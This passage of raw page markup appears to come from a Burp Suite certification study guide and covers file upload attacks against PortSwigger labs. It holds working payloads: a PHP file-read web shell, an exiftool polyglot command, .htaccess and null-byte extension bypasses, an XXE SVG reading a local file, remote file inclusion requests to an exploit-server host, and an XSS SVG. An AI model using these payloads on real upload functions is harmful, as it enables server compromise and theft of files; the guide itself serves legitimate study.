9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"#bypass-upload-controls\"\u003eBypass Upload Controls\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#xxe-via-svg-image-upload\"\u003eXXE via SVG Image upload\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#remote-file-inclusion\"\u003eRemote File Inclusion\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#xss-svg-upload\"\u003eXSS SVG Upload\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#race-condition-web-shell-upload\"\u003eRace Condition Web shell upload\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/\" rel=\"nofollow\"\u003eExploit-Notes: File Upload Attack references\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eBypass Upload Controls\u003c/h3\u003e\u003ca id=\"user-content-bypass-upload-controls\" class=\"anchor\" aria-label=\"Permalink: Bypass Upload Controls\" href=\"#bypass-upload-controls\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eA vulnerable image upload function or avatar logo upload, can by exploited and security controls bypassed to upload content to extract sensitive data or execute code server side.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003cem\u003e\u003cstrong\u003eIdentify\u003c/strong\u003e\u003c/em\u003e any type of file upload function.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/file-upload.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/file-upload.png\" alt=\"Identify file upload\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eThe PHP \u003ccode\u003esource code\u003c/code\u003e of the exploit.php file below will read the \u003ccode\u003e/home/carlos/secret\u003c/code\u003e sensitive information.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-text-html-php notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"\u0026lt;?php echo file_get_contents('/home/carlos/secret'); ?\u0026gt;\"\u003e\u003cpre\u003e\u003cspan class=\"pl-ent\"\u003e\u0026lt;?php\u003c/span\u003e \u003cspan class=\"pl-k\"\u003eecho\u003c/span\u003e \u003cspan class=\"pl-en\"\u003efile_get_contents\u003c/span\u003e(\u003cspan class=\"pl-s\"\u003e'\u003cspan class=\"pl-s\"\u003e/home/carlos/secret\u003c/span\u003e'\u003c/span\u003e); \u003cspan class=\"pl-ent\"\u003e?\u0026gt;\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eFile upload vulnerabilities bypass techniques:\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003col dir=\"auto\"\u003e\n\u003cli\u003eUpload the file name and include obfuscated path traversal \u003ccode\u003e..%2fexploit.php\u003c/code\u003e and retrieve the content \u003ccode\u003eGET /files/avatars/..%2fexploit.php\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eUpload a file named, \u003ccode\u003eexploit.php%00.jpg\u003c/code\u003e with trailing null byte character and get the file execution at \u003ccode\u003e/files/avatars/exploit.php\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eCreate \u003cstrong\u003epolygot\u003c/strong\u003e using valid image file, by running the command in bash terminal: \u003ccode\u003eexiftool -Comment=\"\u0026lt;?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?\u0026gt;\" ./stickman.png -o polyglot2023.php\u003c/code\u003e. Once polygot is uploaded, view the extracted data by issuing a GET request to the uploaded path \u003ccode\u003e/files/avatars/polyglot.php\u003c/code\u003e , and search the response content for the phrase \u003ccode\u003eSTART\u003c/code\u003e to obtain the sensitive data.\u003c/li\u003e\n\u003cli\u003eUpload two different files. First upload \u003ccode\u003e.htaccess\u003c/code\u003e with Content-Type: \u003ccode\u003etext/plain\u003c/code\u003e, and the file data value set to \u003ccode\u003eAddType application/x-httpd-php .l33t\u003c/code\u003e. This will allow the upload and execute of second file upload named, \u003ccode\u003eexploit.l33t\u003c/code\u003e with extension \u003ccode\u003el33t\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eMIME type \u003ccode\u003eimage/jpeg\u003c/code\u003e or \u003ccode\u003eimage/png\u003c/code\u003e is only allowed. Bypass the filter by specifying \u003ccode\u003eContent-Type\u003c/code\u003e to value of \u003ccode\u003eimage/jpeg\u003c/code\u003e and then uploading \u003ccode\u003eexploit.php\u003c/code\u003e file.\u003c/li\u003e\n\u003cli\u003eIf target allow \u003ca href=\"#remote-file-inclusion\"\u003eRemote File Include\u003c/a\u003e (RFI), upload from remote URL, then host and exploit file with the following GIF magic bytes: \u003ccode\u003eGIF89a; \u0026lt;?php echo file_get_contents('/home/carlos/secret'); ?\u0026gt;\u003c/code\u003e. The file name on exploit server could read \u003ccode\u003eimage.php%00.gif\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eDouble file extension bypass filter \u003ccode\u003eexploit.csv.php\u003c/code\u003e.\u003c/li\u003e\n\u003c/ol\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eMatching file upload vulnerable labs:\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003col dir=\"auto\"\u003e\n\u003cli\u003e\u003ca href=\"https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal\" rel=\"nofollow\"\u003ePortSwigger Lab: Web shell upload via path traversal\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-obfuscated-file-extension\" rel=\"nofollow\"\u003ePortSwigger Lab: Web shell upload via obfuscated file extension\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-polyglot-web-shell-upload\" rel=\"nofollow\"\u003ePortSwigger Lab: Remote code execution via polyglot web shell upload\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass\" rel=\"nofollow\"\u003ePortSwigger Lab: Web shell upload via extension blacklist bypass\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass\" rel=\"nofollow\"\u003ePortSwigger Lab: Web shell upload via Content-Type restriction bypass\u003c/a\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/file-upload-stages.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/file-upload-stages.png\" alt=\"File upload stages\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eThis \u003ca href=\"https://youtu.be/QHhn0-ermck\" rel=\"nofollow\"\u003eintigriti walkthrough\u003c/a\u003e great explanation of file upload lab.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eXXE via SVG Image upload\u003c/h3\u003e\u003ca id=\"user-content-xxe-via-svg-image-upload\" class=\"anchor\" aria-label=\"Permalink: XXE via SVG Image upload\" href=\"#xxe-via-svg-image-upload\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003cem\u003e\u003cstrong\u003eIdentify\u003c/strong\u003e\u003c/em\u003e image upload on the blog post function that accept \u003cstrong\u003esvg\u003c/strong\u003e images, and observe that the avatars already on blog \u003ccode\u003esource code\u003c/code\u003e is \u003cstrong\u003esvg\u003c/strong\u003e extensions.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eThe content of the image.svg file uploaded:\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-text-xml-svg notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"\u0026lt;?xml version=\u0026quot;1.0\u0026quot; standalone=\u0026quot;yes\u0026quot;?\u0026gt;\u0026lt;!DOCTYPE test [ \u0026lt;!ENTITY xxe SYSTEM \u0026quot;file:///home/carlos/secret\u0026quot; \u0026gt; ]\u0026gt;\u0026lt;svg width=\u0026quot;128px\u0026quot; height=\u0026quot;128px\u0026quot; xmlns=\u0026quot;http://www.w3.org/2000/svg\u0026quot; xmlns:xlink=\u0026quot;http://www.w3.org/1999/xlink\u0026quot; version=\u0026quot;1.1\u0026quot;\u0026gt;\u0026lt;text font-size=\u0026quot;16\u0026quot; x=\u0026quot;0\u0026quot; y=\u0026quot;16\u0026quot;\u0026gt;\u0026amp;xxe;\u0026lt;/text\u0026gt;\u0026lt;/svg\u0026gt;\"\u003e\u003cpre\u003e\u0026lt;?\u003cspan class=\"pl-ent\"\u003exml\u003c/span\u003e \u003cspan class=\"pl-e\"\u003eversion\u003c/span\u003e=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e1.0\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-e\"\u003estandalone\u003c/span\u003e=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eyes\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e?\u0026gt;\u0026lt;!\u003cspan class=\"pl-k\"\u003eDOCTYPE\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003etest\u003c/span\u003e [ \u0026lt;!\u003cspan class=\"pl-k\"\u003eENTITY\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003exxe\u003c/span\u003e\u003cspan class=\"pl-k\"\u003e SYSTEM \u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003efile:///home/carlos/secret\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u0026gt; ]\u0026gt;\u0026lt;\u003cspan class=\"pl-ent\"\u003esvg\u003c/span\u003e \u003cspan class=\"pl-e\"\u003ewidth\u003c/span\u003e=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e128px\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-e\"\u003eheight\u003c/span\u003e=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e128px\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-e\"\u003exmlns\u003c/span\u003e=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003ehttp://www.w3.org/2000/svg\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-e\"\u003exmlns\u003c/span\u003e:\u003cspan class=\"pl-e\"\u003exlink\u003c/span\u003e=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003ehttp://www.w3.org/1999/xlink\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-e\"\u003eversion\u003c/span\u003e=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e1.1\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u0026gt;\u0026lt;\u003cspan class=\"pl-ent\"\u003etext\u003c/span\u003e \u003cspan class=\"pl-e\"\u003efont-size\u003c/span\u003e=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e16\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-e\"\u003ex\u003c/span\u003e=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e0\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-e\"\u003ey\u003c/span\u003e=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e16\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u0026gt;\u003cspan class=\"pl-c1\"\u003e\u0026amp;xxe;\u003c/span\u003e\u0026lt;/\u003cspan class=\"pl-ent\"\u003etext\u003c/span\u003e\u0026gt;\u0026lt;/\u003cspan class=\"pl-ent\"\u003esvg\u003c/span\u003e\u0026gt;\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/xxe-svg-upload.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/xxe-svg-upload.png\" alt=\"xxe svg upload file\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload\" rel=\"nofollow\"\u003ePortSwigger Lab: Exploiting XXE via image file upload\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eRemote File Inclusion\u003c/h3\u003e\u003ca id=\"user-content-remote-file-inclusion\" class=\"anchor\" aria-label=\"Permalink: Remote File Inclusion\" href=\"#remote-file-inclusion\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eRFI function on target allow the upload of image from remote HTTPS URL source and perform to validation checks, the source URL must be \u003ccode\u003eHTTPS\u003c/code\u003e and the file \u003cstrong\u003eextension\u003c/strong\u003e is checked, but the MIME content type or file content is maybe not validated. Incorrect RFI result in response message, \u003ccode\u003eFile must be either a jpg or png\u003c/code\u003e.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eMethods to bypass extension validation:\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003col dir=\"auto\"\u003e\n\u003cli\u003eExtension with varied capitalization, such as .\u003ccode\u003esVG\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eDouble extension, such as \u003ccode\u003e.jpg.svg\u003c/code\u003e or \u003ccode\u003e.svg.jpg\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eExtension with a \u003ca href=\"https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/wordlists/delimiters.txt\"\u003edelimiter\u003c/a\u003e, such as \u003ccode\u003e%0a, %09, %0d, %00, #\u003c/code\u003e. Other examples, \u003ccode\u003efile.png%00.svg\u003c/code\u003e or \u003ccode\u003efile.png\\x0d\\x0a.svg\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eEmpty filename, \u003ccode\u003e.svg\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eTry to cut allowed extension with more than the maximum filename length.\u003c/li\u003e\n\u003c/ol\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eBelow scenario could be exploited using \u003ca href=\"#ssrf---server-side-request-forgery\"\u003eSSRF\u003c/a\u003e or RFI. Did not solve this challenge.....\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"POST /admin-panel/admin-img-file\nHost: TARGET.net\nCookie: session=AdminCookieTokenValue\nReferer: https://TARGET.net/admin-panel\n\ncsrf=u4r8fg90d7b09j4mm6k67m3\u0026amp;fileurl=https://EXPLOIT.net/image.sVg\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003ePOST /admin-panel/admin-img-file\nHost: TARGET.net\nCookie: session=AdminCookieTokenValue\nReferer: https://TARGET.net/admin-panel\n\ncsrf=u4r8fg90d7b09j4mm6k67m3\u0026amp;fileurl=https://EXPLOIT.net/image.sVg\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"POST /admin-panel/admin-img-file\nHost: TARGET.net\nCookie: session=AdminCookieTokenValue\nReferer: https://TARGET.net/admin-panel\n\ncsrf=u4r8fg90d7b09j4mm6k67m3\u0026amp;fileurl=http://localhost:6566/\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003ePOST /admin-panel/admin-img-file\nHost: TARGET.net\nCookie: session=AdminCookieTokenValue\nReferer: https://TARGET.net/admin-panel\n\ncsrf=u4r8fg90d7b09j4mm6k67m3\u0026amp;fileurl=http://localhost:6566/\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/RFI-function.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/RFI-function.png\" alt=\"RFI function\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eI am missing some key info and need to \u003cem\u003e\u003cstrong\u003eidentify\u003c/strong\u003e\u003c/em\u003e PortSwigger research about RFI.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eBut the method below works for sure. It is taken from DingyShark's git (\u003ca href=\"https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#file-upload-vulnerabilities\"\u003ehttps://github.com/DingyShark/BurpSuiteCertifiedPractitioner#file-upload-vulnerabilities\u003c/a\u003e)\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003col dir=\"auto\"\u003e\n\u003cli\u003eTo exploit this vulnerability, paste php payload in body section of your exploit server and name it shell.php:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"\u0026lt;?php echo file_get_contents('/home/carlos/secret'); ?\u0026gt;\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003e\u0026lt;?php echo file_get_contents('/home/carlos/secret'); ?\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003col start=\"2\" dir=\"auto\"\u003e\n\u003cli\u003eTo bypass filters and provoke RFI, use the next payload:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"https://exploit-server.com/shell.php#kek.jpg\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003ehttps://exploit-server.com/shell.php#kek.jpg\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eXSS SVG Upload\u003c/h3\u003e\u003ca id=\"user-content-xss-svg-upload\" class=\"anchor\" aria-label=\"Permalink: XSS SVG Upload\" href=\"#xss-svg-upload\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eUploading of SVG file that contains JavaScript that performs cross site scripting attack.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-text-xml notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"\u0026lt;?xml version=\u0026quot;1.0\u0026quot; standalone=\u0026quot;no\u0026quot;?\u0026gt;\n\u0026lt;!DOCTYPE svg PUBLIC \u0026quot;-//W3C//DTD SVG 1.1//EN\u0026quot; \u0026quot;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\u0026quot;\u0026gt;\n\n\u0026lt;svg version=\u0026quot;1.1\u0026quot; baseProfile=\u0026quot;full\u0026quot; xmlns=\u0026quot;http://www.w3.org/2000/svg\u0026quot;\u0026gt;\n   \u0026lt;rect width=\u0026quot;300\u0026quot; height=\u0026quot;100\u0026quot; style=\u0026quot;fill:rgb(255,0,0);stroke-width:3;stroke:rgb(0,0,0)\u0026quot; /\u0026gt;\n   \u0026lt;script type=\u0026quot;text/javascript\u0026quot;\u0026gt;\n      alert(\u0026quot;XSS!\u0026quot;);\n   \u0026lt;/script\u0026gt;\n\u0026lt;/svg\u0026gt;\"\u003e\u003cpre\u003e\u0026lt;?\u003cspan class=\"pl-ent\"\u003exml\u003c/span\u003e\u003cspan class=\"pl-e\"\u003e version\u003c/span\u003e=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e1.0\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"pl-e\"\u003e standalone\u003c/span\u003e=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003eno\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e?\u0026gt;\n\u0026lt;!\u003cspan class=\"pl-ent\"\u003eDOCTYPE\u003c/span\u003e \u003cspan class=\"pl-e\"\u003esvg\u003c/span\u003e PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\"\u0026gt;\n\n\u0026lt;\u003cspan class=\"pl-ent\"\u003esvg\u003c/span\u003e \u003cspan class=\"pl-e\"\u003eversion\u003c/span\u003e=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e1.1\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-e\"\u003ebaseProfile\u003c/span\u003e=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003efull\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-e\"\u003exmlns\u003c/span\u003e=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003ehttp://www.w3.org/2000/svg\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u0026gt;\n   \u0026lt;\u003cspan class=\"pl-ent\"\u003erect\u003c/span\u003e \u003cspan class=\"pl-e\"\u003ewidth\u003c/span\u003e=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e300\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-e\"\u003eheight\u003c/span\u003e=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e100\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e \u003cspan class=\"pl-e\"\u003estyle\u003c/span\u003e=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003efill:rgb(255,0,0);stroke-width:3;stroke:rgb(0,0,0)\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e /\u0026gt;\n   \u0026lt;\u003cspan class=\"pl-ent\"\u003escript\u003c/span\u003e \u003cspan class=\"pl-e\"\u003etype\u003c/span\u003e=\u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003etext/javascript\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u0026gt;\n      alert(\"XSS!\");\n   \u0026lt;/\u003cspan class=\"pl-ent\"\u003escript\u003c/span\u003e\u0026gt;\n\u0026lt;/\u003cspan class=\"pl-ent\"\u003esvg\u003c/span\u003e\u0026gt;\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" 